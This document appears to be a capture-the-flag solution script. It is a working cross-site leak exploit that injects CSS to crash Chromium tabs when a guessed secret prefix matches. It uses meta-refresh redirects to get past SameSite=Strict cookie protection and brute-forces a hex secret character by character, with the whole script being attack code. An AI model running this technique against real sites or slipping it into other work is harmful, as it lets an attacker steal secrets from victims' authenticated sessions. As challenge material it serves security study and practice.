<script>
    (async () => {
        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        const TARGET = "{{target}}";
        const CHARSET = "0123456789abcdef";
        // tries to crash the browser if the guess is correct https://issues.chromium.org/issues/410985016
        const CSS_CRASH = `<style>
:where(body[secret^="GUESS"]) .z {float: inline-start;  }
* {text-wrap: pretty; }
</style><a>1</p><dir><legend class="z"></legend><details>
<meta http-equiv="refresh" content="0; URL='${location.href}x'" />`; // if the tab crashes, the redirect doesn't happen

	    let secret = "";

        async function oracle(c) {
            const q = CSS_CRASH.replace("GUESS", secret + c);
            let url = `${TARGET}/?customize=${encodeURIComponent(q)}`;
            // secret cookie is Samesite=Strict, so with a direct navigation the cookie is not sent. this issue can be bypassed with a meta refresh
            const thought = `<meta http-equiv="refresh" content="0; URL='${url}'" />`;
            const w = open('/csrf?'+ c +'&content=' + encodeURIComponent(thought), '_blank'); // create a thought that redirects to our payload

            await sleep(1000); // you can lower this value for faster execution, it depends on the loading time of your page
            try {
                w.location.href; // if we can access location.href, the tab didn't crash
            } catch {
                return true;
            } finally {
                w.close();
            }
            return false;
        }

        try {
            let w = open('/login', '_blank');
            await sleep(300);
            w.close();

            const secret_len = 6;
            const time = performance.now();

            for (let i = 0; i < secret_len; i++) {
                let promises = [];
                let found = [];

                for (let c of CHARSET) {
                    if (found.length > 0) break;
                    const inner = async () => { if (await oracle(c)) found.push(c) };
                    promises.push(inner()) // make multiple guesses in parallel
                    await sleep(100)
                }
        		
                await Promise.all(promises); // wait for all tabs to close
                if (!found.length) break;

                secret += found[0]; // the first that crashed is the correct guess
                console.log('curr ', secret);
            }

            if (secret.length === secret_len) {
                console.log('secret', secret)
		        let flag = await (await fetch('/flag?secret='+secret)).text() // win!
        		console.log('[+] flag!', flag);
            } else {
                console.log('partial ', secret)
            }
            console.log('took', (performance.now() - time));
        } catch (e) {
            console.log('error', e.message);
        }
    })();
</script>

